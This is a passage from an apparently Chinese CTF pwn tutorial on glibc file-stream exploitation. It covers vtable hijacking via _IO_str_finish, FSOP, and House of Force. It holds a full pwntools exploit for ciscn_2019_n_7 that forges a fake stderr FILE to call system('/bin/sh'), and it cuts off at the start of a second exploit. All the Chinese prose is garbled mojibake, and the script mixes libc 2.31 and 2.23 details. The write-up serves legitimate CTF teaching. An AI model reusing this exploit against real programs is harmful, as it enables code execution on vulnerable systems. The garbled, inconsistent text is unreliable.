_IO_default_uflow),<br>JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>JUMP_INIT(xsputn, _IO_default_xsputn),<br>JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>JUMP_INIT(seekoff, _IO_str_seekoff),<br>JUMP_INIT(seekpos, _IO_default_seekpos),<br>JUMP_INIT(setbuf, _IO_default_setbuf),<br>JUMP_INIT(sync, _IO_default_sync),<br>JUMP_INIT(doallocate, _IO_default_doallocate),<br>JUMP_INIT(read, _IO_default_read),<br>JUMP_INIT(write, _IO_default_write),<br>JUMP_INIT(seek, _IO_default_seek),<br>JUMP_INIT(close, _IO_default_close),<br>JUMP_INIT(stat, _IO_default_stat),<br>JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>ä¸éš¾çœ‹å‡ºï¼Œåœ¨<strong>è¯¥è¡¨ä¸­æœ‰æˆ‘ä»¬æ‰€éœ€çš„_IO_str_finishå‡½æ•°ï¼Œä¸”è¯¥è¡¨æœ¬èº«ä¾¿æ˜¯vtableè¡¨åˆ—è¡¨ä¸­çš„ä¸€ä¸ªè¡¨</strong>ï¼Œèƒ½å¾ˆå¥½åœ°é€šè¿‡vtableè¡¨åˆæ³•æ€§æ£€æµ‹ï¼Œå› æ­¤æˆ‘ä»¬åŠ«æŒstdoutæ—¶ä¾¿å°å°†fake vtableåŠ«æŒåˆ°è¯¥è¡¨é™„è¿‘</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬éœ€è¦<strong>ä¿®æ”¹_IO_2_1_stdoutçš„flagçš„æœ€åä¸€ä½ä¸º0ä»¥é€šè¿‡_IO_str_finishå‡½æ•°ä¸­çš„æ£€æµ‹</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * libio/strops.c</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>_IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * libio.h</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF          0x0001 <span class="hljs-comment">/* Don&#x27;t deallocate buffer on close. */</span></span><br></code></pre></td></tr></table></figure>

<p>64ä½ä¸‹å…¶ä¼š<strong>å°†fp + 0d8 + 0x10çš„ä½ç½®ä½œä¸ºå‡½æ•°æŒ‡é’ˆè¿›è¡Œè°ƒç”¨</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>è¿™ç§åˆ©ç”¨æ–¹å¼ä»…é€‚ç”¨äºglibc2.28ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œè‡ªglibc2.28å§‹è¯¥æ®µä»£ç è¢«ä¿®æ”¹ï¼Œæ— æ³•å†é€šè¿‡åŒç§æ–¹å¼è¿›è¡Œåˆ©ç”¨</strong></p>
<p>è‡ªglibc2.28å§‹ï¼Œè¯¥å‡½æ•°<strong>ä¸ä¼šè°ƒç”¨é¢å¤–çš„å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œè€Œæ˜¯ä¼š<code>ç›´æ¥ä½¿ç”¨free()</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br> <span class="hljs-built_in">free</span> (fp-&gt;_IO_buf_base);<br>fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>_IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç±»ä¼¼åœ°ï¼Œ<strong>å¯¹äº_IO_str_overflowçš„åˆ©ç”¨è‡ªglibc2.28å§‹åŒæ ·å¤±æ•ˆ</strong>ï¼Œæºç æ¯”è¾ƒé•¿å°±ä¸åœ¨è¿™é‡Œè´´å‡ºäº†</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish">ctf-wiki: exploit in libc2.24</a></p>
</blockquote>
<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOPå³ File Stream Oriented Programmeâ€”â€”æ–‡ä»¶æµå¯¼å‘ç¼–ç¨‹ï¼Œå³åŸºäº glibc ä¸­æ–‡ä»¶æµç›¸å…³çš„ä¸€ç§åŠ«æŒæ‰‹æ³•ï¼Œå…¶æ ¸å¿ƒæ€æƒ³ä¾¿æ˜¯é€šè¿‡åŠ«æŒæ–‡ä»¶æµçš„ç›¸å…³æµç¨‹ä»¥è¾¾åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ç›®çš„ï¼Œé€šå¸¸æ˜¯  <code>_IO_flush_all_lockp()</code> çš„ç›¸å…³æµç¨‹</p>
<h4 id="IO-list-all-é“¾è¡¨"><a href="#IO-list-all-é“¾è¡¨" class="headerlink" title="_IO_list_all é“¾è¡¨"></a>_IO_list_all é“¾è¡¨</h4><p>åœ¨ glibc ä¸­ä½¿ç”¨ <code> _IO_FILE</code> ç»“æ„æè¿°ä¸€ä¸ªæ–‡ä»¶ï¼Œ è¿›ç¨‹ä¸­çš„ <code> _IO_FILE</code> ç»“æ„ä¼šé€šè¿‡å…¶ _chain æˆå‘˜å½¼æ­¤è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œåœ¨å…¨å±€å˜é‡ <strong>_IO_list_all</strong> ä¸­å‚¨å­˜ç€æŒ‡å‘è¯¥é“¾è¡¨å¤´èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œé€šè¿‡è¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ FILE ç»“æ„ </p>
<p>åœ¨  _IO_FILE ç»“æ„ä¸Šå…¶å®è¿˜æœ‰ä¸€å±‚å¥—å¨ƒç»“æ„å« <code> _IO_FILE_plus</code> ï¼Œå…¶ä¸­æ–°å¢ä¸€ä¸ª vtable æŒ‡é’ˆæŒ‡å‘è¯¥æ–‡ä»¶æµä¼šç”¨åˆ°çš„è™šå‡½æ•°è¡¨</p>
<p>é€šå¸¸æƒ…å†µä¸‹è¿›ç¨‹åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶ï¼Œå…¶é“¾æ¥é¡ºåºä¸ºï¼š<code>stderr-&gt;stdout-&gt;stdin</code>ï¼Œå³åœ¨ <strong>_IO_list_all</strong> ä¸­å‚¨å­˜ç€çš„æ˜¯æŒ‡å‘ <code>_IO_2_1_stderr_</code> çš„æŒ‡é’ˆ</p>
<h4 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp()"></a>_IO_flush_all_lockp()</h4><p>å¸¸è§çš„ FSOP æ‰‹æ³•ä¸»è¦æ˜¯é€šè¿‡ <code>_IO_flush_all_lockp()</code> è¿›è¡Œåˆ©ç”¨ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä»¥ä¸‹æƒ…å†µä¼šè¢«è°ƒç”¨ï¼š</p>
<ul>
<li>é€šè¿‡ libc ç›¸å…³æœºåˆ¶è§¦å‘ abort</li>
<li>é€šè¿‡ exit() æ‰§è¡Œæµç¨‹<ul>
<li>ç”± main å‡½æ•°è¿”å›è‡³ <code>__libc_start_main()</code> åæ‰§è¡Œ <code>exit()</code></li>
</ul>
</li>
</ul>
<p>è¯¥å‡½æ•°å®šä¹‰äºlibio&#x2F;genops.cä¸­ï¼Œä¼šåˆ·æ–°_IO_list_allé“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµ ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶ä¸­çš„å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>...<br> <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>       || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>           &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>       )<br>      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>    result = EOF;<br>...<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ä¸­é—´çš„é‚£ä¸€æ®µå®ä¸€èˆ¬ä¸ºå‡ï¼Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸ç®¡</p>
</blockquote>
<p>é‚£ä¹ˆå…¶ä¼šæ£€æŸ¥å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></li>
<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
</ul>
<p>æŒ‰ç…§ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œåœ¨è¿™ä¸¤ä¸ªæ¡ä»¶é€šè¿‡ä¹‹åä¾¿ä¼šä½¿ç”¨å®<code>_IO_OVERFLOW()</code>ï¼Œå…¶å®šä¹‰äºlibio&#x2F;libioP.hä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span><br></code></pre></td></tr></table></figure>

<p>ç”±æ­¤å¯çŸ¥å…¶<strong>æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__overflow</code><strong>å‡½æ•°ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘FILEè‡ªèº«çš„æŒ‡é’ˆ</strong></p>
<h4 id="ä¾‹é¢˜ï¼šciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#ä¾‹é¢˜ï¼šciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="ä¾‹é¢˜ï¼šciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>ä¾‹é¢˜ï¼šciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h4><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿  æŠ¤  å…¨  å¼€ï¼ˆå™”  å™”  å’š</p>
<p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯çŸ¥è¯¥ç¨‹åºæœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p>ä½†æ˜¯æˆ‘ä»¬<strong>ä»…èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªå †å—ï¼Œä¸”æ— æ³•é‡Šæ”¾å †å—</strong></p>
<p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºåˆ›å»º&#x2F;ç¼–è¾‘å †å—æ—¶è¾“å…¥ä½œè€…å§“åæ—¶<strong>å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥è¦†å†™æ‰ä¸å…¶ç›¸é‚»çš„å †å—æŒ‡é’ˆ</strong>ï¼Œåœ¨æ¥ä¸‹æ¥çš„ç¼–è¾‘ä¸­æˆ‘ä»¬ä¾¿å¯ä»¥<strong>å®ç°ä»»æ„åœ°å€å†™</strong></p>
<p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åŒæ—¶ï¼Œ<strong>è¾“å…¥666åˆ™å¯ç›´æ¥æ³„éœ²libcåœ°å€</strong></p>
<p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äº glibc2.23 ä¸­æœªåŠ å…¥å¯¹ vtable è¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç›´æ¥åŠ«æŒ <code>_IO_2_1_stderr_</code> åŠå…¶vtableè¡¨æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥ get shellï¼ˆstderrä¸ºFILEé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­ç”±äº <code>__overflow() </code>å‡½æ•°ä¼šå°†æŒ‡å‘FILEçš„æŒ‡é’ˆä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ•…è€ƒè™‘å°† â€œ&#x2F;bin&#x2F;shâ€ å­—ç¬¦ä¸²æ„é€ äº fake file çš„å¼€å¤´</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="hljs-comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<span class="hljs-comment">#ELF(&#x27;./libc-2.23.so&#x27;)</span><br>one_gadget = <span class="hljs-number">0xf1147</span><br>p.recv()<br>p.sendline(<span class="hljs-string">b&#x27;666&#x27;</span>)<br>puts_addr = <span class="hljs-built_in">int</span>((p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>)), <span class="hljs-number">16</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.info(<span class="hljs-string">&#x27;libc leak: &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>p.recvuntil(<span class="hljs-string">b&quot;Your choice-&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input string Length: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>p.recvuntil(<span class="hljs-string">b&quot;Author name:&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]))<br><br>fake_file = <span class="hljs-string">b&quot;&quot;</span><br>fake_file += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> <span class="hljs-comment"># _flags, an magic number</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_read_ptr</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_read_end</span><br>fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_read_base</span><br>fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_write_base</span><br>fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<span class="hljs-comment"># _IO_write_ptr</span><br>fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_write_end</span><br>fake_file += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># _IO_buf_base;</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> <span class="hljs-comment"># from _IO_save_base to _markers</span><br>fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="hljs-comment"># the FILE chain ptr</span><br>fake_file += p32(<span class="hljs-number">2</span>) <span class="hljs-comment"># _fileno for stderr is 2</span><br>fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _flags2, usually 0</span><br>fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _old_offset, -1</span><br>fake_file += p16(<span class="hljs-number">0</span>) <span class="hljs-comment"># _cur_column</span><br>fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># _vtable_offset</span><br>fake_file += <span class="hljs-string">b&quot;\n&quot;</span> <span class="hljs-comment"># _shortbuf[1]</span><br>fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># padding</span><br>fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0x1ea0</span>) <span class="hljs-comment"># _IO_stdfile_1_lock</span><br>fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _offset, -1</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _codecvt, usually 0</span><br>fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="hljs-number">0x160</span>) <span class="hljs-comment"># _IO_wide_data_1</span><br>fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <span class="hljs-comment"># from _freeres_list to __pad5</span><br>fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>) <span class="hljs-comment"># _mode, usually -1</span><br>fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span> <span class="hljs-comment"># _unused2</span><br>fake_file = fake_file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># adjust to vtable</span><br>fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="hljs-number">0x10</span>) <span class="hljs-comment"># fake vtable</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;Your choice-&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;New Author name:&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;New contents:&quot;</span>)<br>p.send(fake_file)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x04-æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•"><a href="#0x04-æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•" class="headerlink" title="0x04.æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•"></a>0x04.æ›´åŠ é«˜çº§çš„æ”»å‡»æ‰‹æ³•</h1><blockquote>
<p>ä¸‹é¢çš„ä¸­æ–‡è¯‘åéƒ½æ˜¯çå–çš„233333</p>
</blockquote>
<p>House of XX ç³»åˆ—æ˜¯åœ¨å †åˆ©ç”¨ä¸­ç”±ä¸€äº›åŸºç¡€çš„åˆ©ç”¨æŠ€å·§ç»„åˆè€Œæ¥çš„æ›´ä¸ºå¤æ‚åˆ©ç”¨æ‰‹æ³•</p>
<h2 id="House-of-Botcake-æœºé¥¼ã®æ‰€"><a href="#House-of-Botcake-æœºé¥¼ã®æ‰€" class="headerlink" title="House of Botcake - æœºé¥¼ã®æ‰€"></a>House of Botcake - æœºé¥¼ã®æ‰€</h2><p>ä¸»è¦æ€æƒ³æ˜¯é€šè¿‡å¯¹äºå‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨ä½¿å¾—åœ¨ tcache ä¸ unsorted bin ä¸­æœ‰ç€åŒä¸€ä¸ª chunk</p>
<h3 id="ä¾‹é¢˜ï¼š"><a href="#ä¾‹é¢˜ï¼š" class="headerlink" title="ä¾‹é¢˜ï¼š"></a>ä¾‹é¢˜ï¼š</h3><h2 id="House-of-Einherjar-è‹±çµã®å±‹"><a href="#House-of-Einherjar-è‹±çµã®å±‹" class="headerlink" title="House of Einherjar - è‹±çµã®å±‹"></a>House of Einherjar - è‹±çµã®å±‹</h2><p>é€šè¿‡ä¼ªé€  fake prev_size ä»¥åœ¨ chunk åˆå¹¶çš„è¿‡ç¨‹ä¸­è¾¾æˆ overlapping</p>
<h3 id="ä¾‹é¢˜ï¼š2016-Seccon-tinypad"><a href="#ä¾‹é¢˜ï¼š2016-Seccon-tinypad" class="headerlink" title="ä¾‹é¢˜ï¼š2016 Seccon tinypad"></a>ä¾‹é¢˜ï¼š2016 Seccon tinypad</h3><h2 id="House-of-Force-åŠ›ã®é‡‘é˜ï¼ˆnot-available-from-glibc-2-29ï¼‰"><a href="#House-of-Force-åŠ›ã®é‡‘é˜ï¼ˆnot-available-from-glibc-2-29ï¼‰" class="headerlink" title="House of Force - åŠ›ã®é‡‘é˜ï¼ˆnot available from glibc 2.29ï¼‰"></a>House of Force - åŠ›ã®é‡‘é˜ï¼ˆnot available from glibc 2.29ï¼‰</h2><p>House of Force ä¸»è¦åŸºäºçš„æ˜¯å¯¹äº top chunk çš„åˆ©ç”¨ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è¯¸å¦‚å †æº¢å‡ºç­‰æ‰‹æ®µå°† top chunk çš„ size æ”¹æˆä¸€ä¸ªè¾ƒå¤§å€¼ï¼ˆå¦‚0xfffffffffffffff1ï¼‰ï¼Œä¸”ç¨‹åºä¸é™åˆ¶æˆ‘ä»¬æ‰€åˆ†é…çš„ chunk çš„å¤§å°ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†é…ä»»æ„å¤§å°çš„ chunk ä»¥æ°å½“çš„åç§»åˆ‡å‰² top chunk ä»¥è¾¾åˆ°ä»»æ„åœ°å€å†™çš„æ•ˆæœ</p>
<p><strong>è‡ª glibc2.29 èµ·æ–°å¢äº†å¯¹ top chunk size çš„åˆæ³•æ€§æ£€æŸ¥ï¼Œhouse of force å°±æ­¤å¤±æ•ˆ</strong></p>
<blockquote>
<p>æ—¶ä»£çš„çœ¼æ³ªäº†ï¼ˆx</p>
</blockquote>
<h3 id="ä¾‹é¢˜ï¼šgyctf-2020-force-House-of-Force"><a href="#ä¾‹é¢˜ï¼šgyctf-2020-force-House-of-Force" class="headerlink" title="ä¾‹é¢˜ï¼šgyctf_2020_force - House of Force"></a>ä¾‹é¢˜ï¼šgyctf_2020_force - House of Force</h3><p>æƒ¯ä¾‹çš„ <code>checksc</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/03/T4nS6jVxFpBUI3J.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>åªæœ‰ä¸€ä¸ªåˆ†é…å †å—çš„åŠŸèƒ½ï¼Œ<strong>ä¸é™åˆ¶å¤§å°</strong>ï¼Œä¼šç»™å‡ºå †å—åœ°å€ï¼Œæœ€å¤šå†™å…¥ <code>0x50</code> å­—èŠ‚ï¼Œè‹¥æ˜¯åˆ†é…å°å †å—åˆ™æ¯«æ— ç–‘é—®å¯ä»¥æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/03/ND1y5ezRKtEP6X8.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ²¡æœ‰ free åŠŸèƒ½ï¼Œä¹Ÿæ²¡æ³•æ‰“å°ï¼Œå”¯ä¸€çš„è¾“å‡ºç‚¹æ˜¯è¾“å‡ºå †å—çš„åœ°å€ï¼Œç”±äºå…¶ä¸é™åˆ¶ size çš„å¤§å°ï¼Œä¸éš¾æƒ³åˆ°è‹¥æ˜¯æˆ‘ä»¬åˆ†é…ä¸€ä¸ªç‰¹åˆ«å¤§çš„ chunk ï¼Œsys_malloc ä¾¿ä¼šé€šè¿‡ MMAP ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€å—ç©ºé—´ï¼Œ<strong>åˆšå¥½æŒ¨ç€ libc æ˜ å°„çš„ç©ºé—´</strong>ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥è·å¾— libc çš„åœ°å€</p>
<p>æœ‰æº¢å‡ºï¼Œlibc 2.23 ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡ House of Force åŠ«æŒ top chunk è¿›è¡Œä»»æ„åœ°å€å†™æ”¹ __malloc_hook ä¸º one_gadgetï¼Œä»¥åŠåˆ«å¿˜äº† realloc è°ƒæ ˆ</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 